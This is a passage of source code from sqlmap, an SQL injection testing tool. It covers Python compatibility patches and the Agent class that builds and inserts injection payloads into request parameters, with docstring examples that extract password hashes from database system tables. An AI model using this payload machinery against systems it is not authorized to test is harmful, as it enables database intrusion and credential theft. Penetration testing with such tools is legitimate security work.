singleTimeWarnMessage\nfrom lib.core.compat import xrange\nfrom lib.core.convert import stdoutEncode\nfrom lib.core.data import conf\nfrom lib.core.enums import PLACE\nfrom lib.core.option import _setHTTPHandlers\nfrom lib.core.option import setVerbosity\nfrom lib.core.settings import INVALID_UNICODE_PRIVATE_AREA\nfrom lib.core.settings import INVALID_UNICODE_CHAR_FORMAT\nfrom lib.core.settings import IS_WIN\nfrom lib.request.templates import getPageTemplate\nfrom thirdparty import six\nfrom thirdparty.six import unichr as _unichr\nfrom thirdparty.six.moves import http_client as _http_client\n\n_rand = 0\n\ndef dirtyPatches():\n    \"\"\"\n    Place for \"dirty\" Python related patches\n    \"\"\"\n\n    # accept overly long result lines (e.g. SQLi results in HTTP header responses)\n    _http_client._MAXLINE = 1 * 1024 * 1024\n\n    # prevent double chunked encoding in case of sqlmap chunking (Note: Python3 does it automatically if 'Content-length' is missing)\n    if six.PY3:\n        if not hasattr(_http_client.HTTPConnection, \"__send_output\"):\n            _http_client.HTTPConnection.__send_output = _http_client.HTTPConnection._send_output\n\n        def _send_output(self, *args, **kwargs):\n            if conf.get(\"chunked\") and \"encode_chunked\" in kwargs:\n                kwargs[\"encode_chunked\"] = False\n            self.__send_output(*args, **kwargs)\n\n        _http_client.HTTPConnection._send_output = _send_output\n\n    # add support for inet_pton() on Windows OS\n    if IS_WIN:\n        from thirdparty.wininetpton import win_inet_pton\n\n    # Reference: https://github.com/nodejs/node/issues/12786#issuecomment-298652440\n    codecs.register(lambda name: codecs.lookup(\"utf-8\") if name == \"cp65001\" else None)\n\n    # Reference: http://bugs.python.org/issue17849\n    if hasattr(_http_client, \"LineAndFileWrapper\"):\n        def _(self, *args):\n            return self._readline()\n\n        _http_client.LineAndFileWrapper._readline = _http_client.LineAndFileWrapper.readline\n        _http_client.LineAndFileWrapper.readline = _\n\n    # to prevent too much \"guessing\" in case of binary data retrieval\n    thirdparty.chardet.universaldetector.MINIMUM_THRESHOLD = 0.90\n\n    match = re.search(r\" --method[= ](\\w+)\", \" \".join(sys.argv))\n    if match and match.group(1).upper() != PLACE.POST:\n        PLACE.CUSTOM_POST = PLACE.CUSTOM_POST.replace(\"POST\", \"%s (body)\" % match.group(1))\n\n    # Reference: https://github.com/sqlmapproject/sqlmap/issues/4314\n    try:\n        os.urandom(1)\n    except NotImplementedError:\n        if six.PY3:\n            os.urandom = lambda size: bytes(random.randint(0, 255) for _ in range(size))\n        else:\n            os.urandom = lambda size: \"\".join(chr(random.randint(0, 255)) for _ in xrange(size))\n\n    # Reference: https://github.com/sqlmapproject/sqlmap/issues/5727\n    # Reference: https://stackoverflow.com/a/14076841\n    try:\n        import pymysql\n        pymysql.install_as_MySQLdb()\n    except (ImportError, AttributeError):\n        pass\n\n    # Reference: https://github.com/bottlepy/bottle/blob/df67999584a0e51ec5b691146c7fa4f3c87f5aac/bottle.py\n    # Reference: https://python.readthedocs.io/en/v2.7.2/library/inspect.html#inspect.getargspec\n    if not hasattr(inspect, \"getargspec\") and hasattr(inspect, \"getfullargspec\"):\n        ArgSpec = collections.namedtuple(\"ArgSpec\", (\"args\", \"varargs\", \"keywords\", \"defaults\"))\n\n        def makelist(data):\n            if isinstance(data, (tuple, list, set, dict)):\n                return list(data)\n            elif data:\n                return [data]\n            else:\n                return []\n\n        def getargspec(func):\n            spec = inspect.getfullargspec(func)\n            kwargs = makelist(spec[0]) + makelist(spec.kwonlyargs)\n            return ArgSpec(kwargs, spec[1], spec[2], spec[3])\n\n        inspect.getargspec = getargspec\n\n    # Installing \"reversible\" unicode (decoding) error handler\n    def _reversible(ex):\n        if INVALID_UNICODE_PRIVATE_AREA:\n            return (u\"\".join(_unichr(int('000f00%2x' % (_ if isinstance(_, int) else ord(_)), 16)) for _ in ex.object[ex.start:ex.end]), ex.end)\n        else:\n            return (u\"\".join(INVALID_UNICODE_CHAR_FORMAT % (_ if isinstance(_, int) else ord(_)) for _ in ex.object[ex.start:ex.end]), ex.end)\n\n    codecs.register_error(\"reversible\", _reversible)\n\n    # Reference: https://github.com/sqlmapproject/sqlmap/issues/5731\n    if not hasattr(logging, \"_acquireLock\"):\n        def _acquireLock():\n            if logging._lock:\n                logging._lock.acquire()\n\n        logging._acquireLock = _acquireLock\n\n    if not hasattr(logging, \"_releaseLock\"):\n        def _releaseLock():\n            if logging._lock:\n                logging._lock.release()\n\n        logging._releaseLock = _releaseLock\n\ndef resolveCrossReferences():\n    \"\"\"\n    Place for cross-reference resolution\n    \"\"\"\n\n    lib.core.threads.isDigit = isDigit\n    lib.core.threads.readInput = readInput\n    lib.core.common.getPageTemplate = getPageTemplate\n    lib.core.convert.filterNone = filterNone\n    lib.core.convert.isListLike = isListLike\n    lib.core.convert.shellExec = shellExec\n    lib.core.convert.singleTimeWarnMessage = singleTimeWarnMessage\n    lib.core.option._pympTempLeakPatch = pympTempLeakPatch\n    lib.request.connect.setHTTPHandlers = _setHTTPHandlers\n    lib.utils.search.setHTTPHandlers = _setHTTPHandlers\n    lib.controller.checks.setVerbosity = setVerbosity\n    lib.utils.sqlalchemy.getSafeExString = getSafeExString\n    thirdparty.ansistrm.ansistrm.stdoutEncode = stdoutEncode\n\ndef pympTempLeakPatch(tempDir):\n    \"\"\"\n    Patch for \"pymp\" leaking directories inside Python3\n    \"\"\"\n\n    try:\n        import multiprocessing.util\n        multiprocessing.util.get_temp_dir = lambda: tempDir\n    except:\n        pass\n\ndef unisonRandom():\n    \"\"\"\n    Unifying random generated data across different Python versions\n    \"\"\"\n\n    def _lcg():\n        global _rand\n        a = 1140671485\n        c = 128201163\n        m = 2 ** 24\n        _rand = (a * _rand + c) % m\n        return _rand\n\n    def _randint(a, b):\n        _ = a + (_lcg() % (b - a + 1))\n        return _\n\n    def _choice(seq):\n        return seq[_randint(0, len(seq) - 1)]\n\n    def _sample(population, k):\n        return [_choice(population) for _ in xrange(k)]\n\n    def _seed(seed):\n        global _rand\n        _rand = seed\n\n    random.choice = _choice\n    random.randint = _randint\n    random.sample = _sample\n    random.seed = _seed\n", "lib/core/agent.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import Backend\nfrom lib.core.common import extractRegexResult\nfrom lib.core.common import filterNone\nfrom lib.core.common import getSQLSnippet\nfrom lib.core.common import getTechnique\nfrom lib.core.common import getTechniqueData\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import isDBMSVersionAtLeast\nfrom lib.core.common import isNumber\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.common import randomInt\nfrom lib.core.common import randomStr\nfrom lib.core.common import safeSQLIdentificatorNaming\nfrom lib.core.common import safeStringFormat\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.common import splitFields\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import urlencode\nfrom lib.core.common import zeroDepthSearch\nfrom lib.core.compat import xrange\nfrom lib.core.convert import encodeBase64\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import queries\nfrom lib.core.dicts import DUMP_DATA_PREPROCESS\nfrom lib.core.dicts import FROM_DUMMY_TABLE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import FORK\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.enums import PLACE\nfrom lib.core.enums import POST_HINT\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.settings import BOUNDED_BASE64_MARKER\nfrom lib.core.settings import BOUNDARY_BACKSLASH_MARKER\nfrom lib.core.settings import BOUNDED_INJECTION_MARKER\nfrom lib.core.settings import CUSTOM_INJECTION_MARK_CHAR\nfrom lib.core.settings import DEFAULT_COOKIE_DELIMITER\nfrom lib.core.settings import DEFAULT_GET_POST_DELIMITER\nfrom lib.core.settings import GENERIC_SQL_COMMENT\nfrom lib.core.settings import GENERIC_SQL_COMMENT_MARKER\nfrom lib.core.settings import INFERENCE_MARKER\nfrom lib.core.settings import NULL\nfrom lib.core.settings import PAYLOAD_DELIMITER\nfrom lib.core.settings import REPLACEMENT_MARKER\nfrom lib.core.settings import SINGLE_QUOTE_MARKER\nfrom lib.core.settings import SLEEP_TIME_MARKER\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.core.unescaper import unescaper\nfrom thirdparty import six\n\nclass Agent(object):\n    \"\"\"\n    This class defines the SQL agent methods.\n    \"\"\"\n\n    def payloadDirect(self, query):\n        query = self.cleanupPayload(query)\n\n        if query.upper().startswith(\"AND \"):\n            query = re.sub(r\"(?i)AND \", \"SELECT \", query, 1)\n        elif query.upper().startswith(\" UNION ALL \"):\n            query = re.sub(r\"(?i) UNION ALL \", \"\", query, 1)\n        elif query.startswith(\"; \"):\n            query = query.replace(\"; \", \"\", 1)\n\n        if Backend.getIdentifiedDbms() in (DBMS.ORACLE,):  # non-standard object(s) make problems to a database connector while returned (e.g. XMLTYPE)\n            _, _, _, _, _, _, fieldsToCastStr, _ = self.getFields(query)\n            for field in fieldsToCastStr.split(','):\n                query = query.replace(field, self.nullAndCastField(field))\n\n        if kb.tamperFunctions:\n            for function in kb.tamperFunctions:\n                query = function(payload=query)\n\n        return query\n\n    def payload(self, place=None, parameter=None, value=None, newValue=None, where=None):\n        \"\"\"\n        This method replaces the affected parameter with the SQL\n        injection statement to request\n        \"\"\"\n\n        if conf.direct:\n            return self.payloadDirect(newValue)\n\n        retVal = \"\"\n\n        if kb.forceWhere:\n            where = kb.forceWhere\n        elif where is None and isTechniqueAvailable(getTechnique()):\n            where = getTechniqueData().where\n\n        if kb.injection.place is not None:\n            place = kb.injection.place\n\n        if kb.injection.parameter is not None:\n            parameter = kb.injection.parameter\n\n        paramString = conf.parameters[place]\n        paramDict = conf.paramDict[place]\n        origValue = getUnicode(paramDict[parameter])\n        newValue = getUnicode(newValue) if newValue else newValue\n        base64Encoding = re.sub(r\" \\(.+\", \"\", parameter) in conf.base64Parameter\n\n        if place == PLACE.URI or BOUNDED_INJECTION_MARKER in origValue:\n            paramString = origValue\n            if place == PLACE.URI:\n                origValue = origValue.split(kb.customInjectionMark)[0]\n            else:\n                origValue = filterNone(re.search(_, origValue.split(BOUNDED_INJECTION_MARKER)[0]) for _ in (r\"\\w+\\Z\", r\"[^\\\"'><]+\\Z\", r\"[^ ]+\\Z\"))[0].group(0)\n            origValue = origValue[origValue.rfind('/') + 1:]\n            for char in ('?', '=', ':', ',', '&'):\n                if char in origValue:\n                    origValue = origValue[origValue.rfind(char) + 1:]\n        elif place == PLACE.CUSTOM_POST:\n            paramString = origValue\n            origValue = origValue.split(kb.customInjectionMark)[0]\n            if kb.postHint in (POST_HINT.SOAP, POST_HINT.XML):\n                origValue = re.split(r\"['\\\">]\", origValue)[-1]\n            elif kb.postHint in (POST_HINT.JSON, POST_HINT.JSON_LIKE):\n                match = re.search(r\"['\\\"]\", origValue)\n                quote = match.group(0) if match else '\"'\n                origValue = extractRegexResult(r\"%s\\s*:\\s*(?P<result>\\d+)\\Z\" % quote, origValue) or extractRegexResult(r\"(?P<result>[^%s]*)\\Z\" % quote, origValue)\n            else:\n                _ = extractRegexResult(r\"(?s)(?P<result>[^\\s<>{}();'\\\"&]+\\Z)\", origValue) or \"\"\n                origValue = _.split('=', 1)[1] if '=' in _ else _\n        elif place == PLACE.CUSTOM_HEADER:\n            paramString = origValue\n            origValue = origValue[origValue.find(',') + 1:]\n            origValue = origValue.split(kb.customInjectionMark)[0]\n            match = re.search(r\"([^;]+)=(?P<value>[^;]*);?\\Z\", origValue)\n            if match:\n                origValue = match.group(\"value\")\n            elif ',' in paramString:\n                header = paramString.split(',')[0]\n\n                if header.upper() == HTTP_HEADER.AUTHORIZATION.upper():\n                    origValue = origValue.split(' ')[-1].split(':')[-1]\n\n        origValue = origValue or \"\"\n\n        if value is None:\n            if where == PAYLOAD.WHERE.ORIGINAL:\n                value = origValue\n            elif where == PAYLOAD.WHERE.NEGATIVE:\n                if conf.invalidLogical:\n                    match = re.search(r\"\\A[^ ]+\", newValue)\n                    newValue = newValue[len(match.group() if match else \"\"):]\n                    _ = randomInt(2)\n                    value = \"%s%s AND %s LIKE %s\" % (origValue, match.group() if match else \"\", _, _ + 1)\n                elif conf.invalidBignum:\n                    value = randomInt(6)\n                elif conf.invalidString:\n                    value = randomStr(6)\n                else:\n                    if newValue.startswith(\"-\"):\n                        value = \"\"\n                    else:\n                        value = \"-%s\" % randomInt()\n            elif where == PAYLOAD.WHERE.REPLACE:\n                value = \"\"\n            else:\n                value = origValue\n\n            newValue = \"%s%s\" % (value, newValue)\n\n        newValue = self.cleanupPayload(newValue, origValue) or \"\"\n\n        if base64Encoding:\n            _newValue = newValue\n            _origValue = origValue\n\n            if newValue:\n                newValue = newValue.replace(BOUNDARY_BACKSLASH_MARKER, '\\\\')\n                newValue = self.adjustLateValues(newValue)\n\n            # NOTE: https://github.com/sqlmapproject/sqlmap/issues/5488\n            if kb.customInjectionMark in origValue:\n                payload = newValue.replace(origValue, \"\")\n                newValue = origValue.replace(kb.customInjectionMark, payload)\n\n            # TODO: support for POST_HINT\n            newValue = \"%s%s%s\" % (BOUNDED_BASE64_MARKER, newValue, BOUNDED_BASE64_MARKER)\n\n            if parameter in kb.base64Originals:\n                origValue = kb.base64Originals[parameter]\n            else:\n                origValue = encodeBase64(origValue, binary=False, encoding=conf.encoding or UNICODE_ENCODING)\n\n        if place in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER):\n            _ = \"%s%s\" % (origValue, kb.customInjectionMark)\n\n            if kb.postHint == POST_HINT.JSON and isNumber(origValue) and not isNumber(newValue) and '\"%s\"' % _ not in paramString:\n                newValue = '\"%s\"' % self.addPayloadDelimiters(newValue)\n            elif kb.postHint == POST_HINT.JSON_LIKE and isNumber(origValue) and not isNumber(newValue) and re.search(r\"['\\\"]%s['\\\"]\" % re.escape(_), paramString) is None:\n                newValue = \"'%s'\" % self.addPayloadDelimiters(newValue)\n            else:\n                newValue = self.addPayloadDelimiters(newValue)\n\n            if newValue:\n                newValue = newValue.replace(kb.customInjectionMark, REPLACEMENT_MARKER)\n                retVal = paramString.replace(_, newValue)\n\n            retVal = retVal.replace(kb.customInjectionMark, \"\").replace(REPLACEMENT_MARKER, kb.customInjectionMark)\n        elif BOUNDED_INJECTION_MARKER in paramDict[parameter]:\n            if base64Encoding:\n                retVal = paramString.replace(\"%s%s\" % (_origValue, BOUNDED_INJECTION_MARKER), _newValue)\n                match = re.search(r\"(%s)=([^&]*)\" % re.sub(r\" \\(.+\", \"\", parameter), retVal)\n                if match:\n                    retVal = retVal.replace(match.group(0), \"%s=%s\" % (match.group(1), encodeBase64(match.group(2), binary=False, encoding=conf.encoding or UNICODE_ENCODING)))\n            else:\n                retVal = paramString.replace(\"%s%s\" % (origValue, BOUNDED_INJECTION_MARKER), self.addPayloadDelimiters(newValue))\n        elif place in (PLACE.USER_AGENT, PLACE.REFERER, PLACE.HOST):\n            retVal = paramString.replace(origValue, self.addPayloadDelimiters(newValue))\n        else:\n            def _(pattern, repl, string):\n                retVal = string\n                match = None\n\n                for match in re.finditer(pattern, string or \"\"):\n                    pass\n\n                if match:\n                    while True:\n                        _ = re.search(r\"\\\\g<([^>]+)>\", repl)\n                        if _:\n                            try:\n                                repl = repl.replace(_.group(0), match.group(int(_.group(1)) if _.group(1).isdigit() else _.group(1)))\n                            except IndexError:\n                                break\n                        else:\n                            break\n                    retVal = string[:match.start()] + repl + string[match.end():]\n                return retVal\n\n            if origValue:\n                regex = r\"(\\A|\\b)%s=%s%s\" % (re.escape(parameter), re.escape(origValue), r\"(\\Z|\\b)\" if origValue[-1].isalnum() else \"\")\n                retVal = _(regex, \"%s=%s\" % (parameter, self.addPayloadDelimiters(newValue)), paramString)\n            else:\n                retVal = _(r\"(\\A|\\b)%s=%s(\\Z|%s|%s|\\s)\" % (re.escape(parameter), re.escape(origValue), DEFAULT_GET_POST_DELIMITER, DEFAULT_COOKIE_DELIMITER), r\"%s=%s\\g<2>\" % (parameter, self.addPayloadDelimiters(newValue)), paramString)\n\n            if retVal == paramString and urlencode(parameter) != parameter:\n                retVal = _(r\"(\\A|\\b)%s=%s\" % (re.escape(urlencode(parameter)), re.escape(origValue)), \"%s=%s\" % (urlencode(parameter), self.addPayloadDelimiters(newValue)), paramString)\n\n        if retVal:\n            retVal = retVal.replace(BOUNDARY_BACKSLASH_MARKER, '\\\\')\n\n        return retVal\n\n    def prefixQuery(self, expression, prefix=None, where=None, clause=None):\n        \"\"\"\n        This method defines how the input expression has to be escaped\n        to perform the injection depending on the injection type\n        identified as valid\n        \"\"\"\n\n        if conf.direct:\n            return self.payloadDirect(expression)\n\n        if expression is None:\n            return None\n\n        expression = self.cleanupPayload(expression)\n        expression = unescaper.escape(expression)\n        query = None\n\n        if where is None and getTechnique() is not None and getTechnique() in kb.injection.data:\n            where = getTechniqueData().where\n\n        # If we are replacing (<where>) the parameter original value with\n        # our payload do not prepend with the prefix\n        if where == PAYLOAD.WHERE.REPLACE and not conf.prefix:  # Note: https://github.com/sqlmapproject/sqlmap/issues/4030\n            query = \"\"\n\n        # If the technique is stacked queries (<stype>) do not put a space\n        # after the prefix or it is in GROUP BY / ORDER BY (<clause>)\n        elif getTechnique() == PAYLOAD.TECHNIQUE.STACKED:\n            query = kb.injection.prefix\n        elif kb.injection.clause == [2, 3] or kb.injection.clause == [2] or kb.injection.clause == [3]:\n            query = kb.injection.prefix\n        elif clause == [2, 3] or clause == [2] or clause == [3]:\n            query = prefix\n\n        # In any other case prepend with the full prefix\n        else:\n            query = kb.injection.prefix or prefix or \"\"\n\n            if \"SELECT '[RANDSTR]'\" in query:  # escaping of pre-WHERE prefixes\n                query = query.replace(\"'[RANDSTR]'\", unescaper.escape(randomStr(), quote=False))\n\n            if not (expression and expression[0] == ';') and not (query and query[-1] in ('(', ')') and expression and expression[0] in ('(', ')')) and not (query and query[-1] == '('):\n                query += \" \"\n\n        query = \"%s%s\" % ((query or \"\").replace('\\\\', BOUNDARY_BACKSLASH_MARKER), expression)\n\n        return query\n\n    def suffixQuery(self, expression, comment=None, suffix=None, where=None, trimEmpty=True):\n        \"\"\"\n        This method appends the DBMS comment to the\n        SQL injection request\n        \"\"\"\n\n        if conf.direct:\n            return self.payloadDirect(expression)\n\n        if expression is None:\n            return None\n\n        expression = self.cleanupPayload(expression)\n\n        # Take default values if None\n        suffix = kb.injection.suffix if kb.injection and suffix is None else suffix\n\n        if getTechnique() is not None and getTechnique() in kb.injection.data:\n            where = getTechniqueData().where if where is None else where\n            comment = getTechniqueData().comment if comment is None else comment\n\n        if any((comment or \"\").startswith(_) for _ in (\"--\", GENERIC_SQL_COMMENT_MARKER)):\n            if Backend.getIdentifiedDbms() and not GENERIC_SQL_COMMENT.startswith(queries[Backend.getIdentifiedDbms()].comment.query):\n                comment = queries[Backend.getIdentifiedDbms()].comment.query\n\n        if comment is not None:\n            expression += comment\n\n        # If we are replacing (<where>) the parameter original value with\n        # our payload do not append the suffix\n        if where == PAYLOAD.WHERE.REPLACE and not conf.suffix:\n            pass\n\n        elif suffix and not comment:\n            if re.search(r\"\\w\\Z\", expression) and re.search(r\"\\A\\w\", suffix):\n                expression += \" \"\n\n            expression += suffix.replace('\\\\', BOUNDARY_BACKSLASH_MARKER)\n\n        return re.sub(r\";\\W*;\", \";\", expression) if trimEmpty else expression\n\n    def cleanupPayload(self, payload, origValue=None):\n        if not isinstance(payload, six.string_types):\n            return\n\n        replacements = {\n            \"[DELIMITER_START]\": kb.chars.start,\n            \"[DELIMITER_STOP]\": kb.chars.stop,\n            \"[AT_REPLACE]\": kb.chars.at,\n            \"[SPACE_REPLACE]\": kb.chars.space,\n            \"[DOLLAR_REPLACE]\": kb.chars.dollar,\n            \"[HASH_REPLACE]\": kb.chars.hash_,\n            \"[GENERIC_SQL_COMMENT]\": GENERIC_SQL_COMMENT\n        }\n\n        for value in re.findall(r\"\\[[A-Z_]+\\]\", payload):\n            if value in replacements:\n                payload = payload.replace(value, replacements[value])\n\n        for _ in set(re.findall(r\"(?i)\\[RANDNUM(?:\\d+)?\\]\", payload)):\n            payload = payload.replace(_, str(randomInt()))\n\n        for _ in set(re.findall(r\"(?i)\\[RANDSTR(?:\\d+)?\\]\", payload)):\n            payload = payload.replace(_, randomStr())\n\n        if origValue is not None:\n            origValue = getUnicode(origValue)\n\n            if \"[ORIGVALUE]\" in payload:\n                payload = getUnicode(payload).replace(\"[ORIGVALUE]\", origValue if origValue.isdigit() else unescaper.escape(\"'%s'\" % origValue))\n            if \"[ORIGINAL]\" in payload:\n                payload = getUnicode(payload).replace(\"[ORIGINAL]\", origValue)\n\n        if INFERENCE_MARKER in payload:\n            if Backend.getIdentifiedDbms() is not None:\n                inference = queries[Backend.getIdentifiedDbms()].inference\n\n                if \"dbms_version\" in inference:\n                    if isDBMSVersionAtLeast(inference.dbms_version):\n                        inferenceQuery = inference.query\n                    else:\n                        inferenceQuery = inference.query2\n                else:\n                    inferenceQuery = inference.query\n\n                payload = payload.replace(INFERENCE_MARKER, inferenceQuery)\n\n            elif not kb.testMode:\n                errMsg = \"invalid usage of inference payload without \"\n                errMsg += \"knowledge of underlying DBMS\"\n                raise SqlmapNoneDataException(errMsg)\n\n        return payload\n\n    def adjustLateValues(self, payload):\n        \"\"\"\n        Returns payload with a replaced late tags (e.g. SLEEPTIME)\n        \"\"\"\n\n        if payload:\n            for match in re.finditer(r\"(?s)%s(.*?)%s\" % (BOUNDED_BASE64_MARKER, BOUNDED_BASE64_MARKER), payload):\n                _ = encodeBase64(match.group(1), binary=False, encoding=conf.encoding or UNICODE_ENCODING, safe=conf.base64Safe)\n                payload = payload.replace(match.group(0), _)\n\n            payload = payload.replace(SLEEP_TIME_MARKER, str(conf.timeSec))\n            payload = payload.replace(SINGLE_QUOTE_MARKER, \"'\")\n\n            for _ in set(re.findall(r\"\\[RANDNUM(?:\\d+)?\\]\", payload, re.I)):\n                payload = payload.replace(_, str(randomInt()))\n\n            for _ in set(re.findall(r\"\\[RANDSTR(?:\\d+)?\\]\", payload, re.I)):\n                payload = payload.replace(_, randomStr())\n\n            if hashDBRetrieve(HASHDB_KEYS.DBMS_FORK) in (FORK.MEMSQL, FORK.TIDB, FORK.DRIZZLE):\n                payload = re.sub(r\"(?i)\\bORD\\(\", \"ASCII(\", payload)\n                payload = re.sub(r\"(?i)\\bMID\\(\", \"SUBSTR(\", payload)\n                payload = re.sub(r\"(?i)\\bNCHAR\\b\", \"CHAR\", payload)\n\n            # NOTE: https://github.com/sqlmapproject/sqlmap/issues/5057\n            match = re.search(r\"(=0x)(303a303a)3(\\d{2,})\", payload)\n            if match:\n                payload = payload.replace(match.group(0), \"%s%s%s\" % (match.group(1), match.group(2).upper(), \"\".join(\"3%s\" % _ for _ in match.group(3))))\n\n        return payload\n\n    def getComment(self, request):\n        \"\"\"\n        Returns comment form for the given request\n        \"\"\"\n\n        return request.comment if \"comment\" in request else \"\"\n\n    def hexConvertField(self, field):\n        \"\"\"\n        Returns hex converted field string\n        \"\"\"\n\n        rootQuery = queries[Backend.getIdentifiedDbms()]\n        hexField = field\n\n        if \"hex\" in rootQuery and hasattr(rootQuery.hex, \"query\"):\n            hexField = rootQuery.hex.query % field\n        else:\n            warnMsg = \"switch '--hex' is currently not supported on DBMS '%s'\" % Backend.getIdentifiedDbms()\n            singleTimeWarnMessage(warnMsg)\n\n        return hexField\n\n    def nullAndCastField(self, field):\n        \"\"\"\n        Take in input a field string and return its processed nulled and\n        casted field string.\n\n        Examples:\n\n        MySQL input:  VERSION()\n        MySQL output: IFNULL(CAST(VERSION() AS CHAR(10000)), ' ')\n        MySQL scope:  VERSION()\n\n        PostgreSQL input:  VERSION()\n        PostgreSQL output: COALESCE(CAST(VERSION() AS CHARACTER(10000)), ' ')\n        PostgreSQL scope:  VERSION()\n\n        Oracle input:  banner\n        Oracle output: NVL(CAST(banner AS VARCHAR(4000)), ' ')\n        Oracle scope:  SELECT banner FROM v$version WHERE ROWNUM=1\n\n        Microsoft SQL Server input:  @@VERSION\n        Microsoft SQL Server output: ISNULL(CAST(@@VERSION AS VARCHAR(8000)), ' ')\n        Microsoft SQL Server scope:  @@VERSION\n\n        @param field: field string to be processed\n        @type field: C{str}\n\n        @return: field string nulled and casted\n        @rtype: C{str}\n        \"\"\"\n\n        match = re.search(r\"(?i)(.+)( AS \\w+)\\Z\", field)\n        if match:\n            field, suffix = match.groups()\n        else:\n            suffix = \"\"\n\n        nulledCastedField = field\n\n        if field and Backend.getIdentifiedDbms():\n            rootQuery = queries[Backend.getIdentifiedDbms()]\n\n            if field.startswith(\"(CASE\") or field.startswith(\"(IIF\") or conf.noCast and not (field.startswith(\"COUNT(\") and Backend.getIdentifiedDbms() == DBMS.MSSQL):\n                nulledCastedField = field\n            else:\n                if not (Backend.isDbms(DBMS.SQLITE) and not isDBMSVersionAtLeast('3')):\n                    nulledCastedField = rootQuery.cast.query % field\n\n                if re.search(r\"COUNT\\(\", field) and Backend.getIdentifiedDbms() in (DBMS.RAIMA,):\n                    pass\n                elif Backend.getIdentifiedDbms() in (DBMS.ACCESS, DBMS.MCKOI):\n                    nulledCastedField = rootQuery.isnull.query % (nulledCastedField, nulledCastedField)\n                else:\n                    nulledCastedField = rootQuery.isnull.query % nulledCastedField\n\n            kb.binaryField = conf.binaryFields and field in conf.binaryFields\n            if conf.hexConvert or kb.binaryField:\n                nulledCastedField = self.hexConvertField(nulledCastedField)\n\n        if suffix:\n            nulledCastedField += suffix\n\n        if not kb.nchar:\n            nulledCastedField = re.sub(r\"( AS )N(CHAR|VARCHAR)\", r\"\\g<1>\\g<2>\", nulledCastedField)\n\n        return nulledCastedField\n\n    def nullCastConcatFields(self, fields):\n        \"\"\"\n        Take in input a sequence of fields string and return its processed\n        nulled, casted and concatenated fields string.\n\n        Examples:\n\n        MySQL input:  user,password\n        MySQL output: IFNULL(CAST(user AS CHAR(10000)), ' '),'UWciUe',IFNULL(CAST(password AS CHAR(10000)), ' ')\n        MySQL scope:  SELECT user, password FROM mysql.user\n\n        PostgreSQL input:  usename,passwd\n        PostgreSQL output: COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'xRBcZW'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')\n        PostgreSQL scope:  SELECT usename, passwd FROM pg_shadow\n\n        Oracle input:  COLUMN_NAME,DATA_TYPE\n        Oracle output: NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'UUlHUa'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')\n        Oracle scope:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'\n\n        Microsoft SQL Server input:  name,master.dbo.fn_varbintohexstr(password)\n        Microsoft SQL Server output: ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'nTBdow'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')\n        Microsoft SQL Server scope:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins\n\n        @param fields: fields string to be processed\n        @type fields: C{str}\n\n        @return: fields string nulled, casted and concatened\n        @rtype: C{str}\n        \"\"\"\n\n        if not Backend.getIdentifiedDbms():\n            return fields\n\n        if fields.startswith(\"(CASE\") or fields.startswith(\"(IIF\") or fields.startswith(\"SUBSTR\") or fields.startswith(\"MID(\") or re.search(r\"\\A'[^']+'\\Z\", fields):\n            nulledCastedConcatFields = fields\n        else:\n            fieldsSplitted = splitFields(fields)\n            dbmsDelimiter = queries[Backend.getIdentifiedDbms()].delimiter.query\n            nulledCastedFields = []\n\n            for field in fieldsSplitted:\n                field = re.sub(r\"(?i) AS \\w+\\Z\", \"\", field)         # NOTE: fields such as \"... AS type_name\" have to be stripped from the alias part for this functionality to work\n                nulledCastedFields.append(self.nullAndCastField(field))\n\n            delimiterStr = \"%s'%s'%s\" % (dbmsDelimiter, kb.chars.delimiter, dbmsDelimiter)\n            nulledCastedConcatFields = delimiterStr.join(field for field in nulledCastedFields)\n\n        return nulledCastedConcatFields\n\n    def getFields(self, query):\n        \"\"\"\n        Take in input a query string and return its fields (columns) and\n        more details.\n\n        Example:\n\n        Input:  SELECT user, password FROM mysql.user\n        Output: user,password\n\n        @param query: query to be processed\n        @type query: C{str}\n\n        @return: query fields (columns) and more details\n        @rtype: C{str}\n        \"\"\"\n\n        prefixRegex = r\"(?:\\s+(?:FIRST|SKIP|LIMIT(?: \\d+)?)\\s+\\d+)*\"\n        fieldsSelectTop = re.search(r\"\\ASELECT\\s+TOP(\\s+\\d+|\\s*\\([^)]+\\))\\s+(.+?)\\s+FROM\", query, re.I)\n        fieldsSelectRownum = re.search(r\"\\ASELECT\\s+([^()]+?),\\s*ROWNUM AS LIMIT FROM\", query, re.I)\n        fieldsSelectDistinct = re.search(r\"\\ASELECT%s\\s+DISTINCT\\((.+?)\\)\\s+FROM\" % prefixRegex, query, re.I)\n        fieldsSelectCase = re.search(r\"\\ASELECT%s\\s+(\\(CASE WHEN\\s+.+\\s+END\\))\" % prefixRegex, query, re.I)\n        fieldsSelectFrom = re.search(r\"\\ASELECT%s\\s+(.+?)\\s+FROM \" % prefixRegex, query, re.I)\n        fieldsExists = re.search(r\"EXISTS\\(([^)]*)\\)\\Z\", query, re.I)\n        fieldsSelect = re.search(r\"\\ASELECT%s\\s+(.*)\" % prefixRegex, query, re.I)\n        fieldsSubstr = re.search(r\"\\A(SUBSTR|MID\\()\", query, re.I)\n        fieldsMinMaxstr = 